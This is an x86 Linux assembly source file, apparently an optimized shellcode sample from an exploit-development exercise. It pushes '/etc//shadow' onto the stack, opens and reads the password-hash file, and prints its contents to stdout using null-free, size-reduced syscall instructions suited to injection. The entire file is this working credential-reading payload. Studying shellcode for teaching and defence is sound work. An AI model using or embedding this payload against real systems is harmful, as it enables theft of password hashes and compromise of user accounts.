; Name; asm_linx86_readfile_sample3-opt.asm
; Author hodorsec

global _start
section .text

_start:
	; Clearing registers
	xor ecx, ecx			; Empty register
	mov eax, ecx			; Empty register
	mov edx, ecx			; Clear registry for syscall read parameter

	; sys_open
	; int open(const char *pathname, int flags);
	push ecx			; NULL-terminate string
	push 0x776f6461 		; woda
	push 0x68732f2f 		; hs//
	push 0x6374652f 		; cte/
	; pop ebx			; Pathname for file to be read, popped from stack into EBX
	mov ebx, esp			; Pathname for file to be read, popped from stackpointer into EBX; pointing to the string last pushed
	; mov eax,0x5			; Syscall for open
	mov al, 0x5			; Syscall for open, smaller instruction
	int 0x80			; Syscall

	xchg eax, ebx			; FD Pointer result from previous syscall in EBX, for usage by read syscall
	; mov ebx, eax
	; xor eax, eax
	xchg eax, ecx			; Clear out EAX by exchanging the already cleared out registry ECX.

	; sys_read
	; ssize_t read(int fd, void *buf, size_t count);
	; pop ecx				; Pop the value from the stack into ECX for string buffer parameter for syscall read
	; mov ecx, esp			; Copy the value from stackpointer into ECX for string buffer parameter for syscall read
	mov dx, 0x0fff
	; push 0x3			; Syscall for read
	; pop eax				; Copy value from stack into EAX
	mov al, 0x3			; Syscall for read
	int 0x80			; Syscall

	xchg eax, edx			; Copy resulting FD from read into EDX for write syscall, count parameter
	xor eax, eax
	
	; sys_write
	; ssize_t write(int fd, const void *buf, size_t count);
	push 1
	pop ebx
	; mov ebx,0x1			; 1 for STDOUT, File Descriptor FD
	; mov eax,0x4			; Syscall for write
	mov al, 0x4			; Syscall write
	int 0x80			; Syscall

	; sys_exit
	; void exit(int status);
	; mov eax,0x1			; 1 for exit
	mov eax, ebx			; Syscall 1
	mov ebx, eax			; Status code zero
	dec ebx
	int 0x80			; Syscall

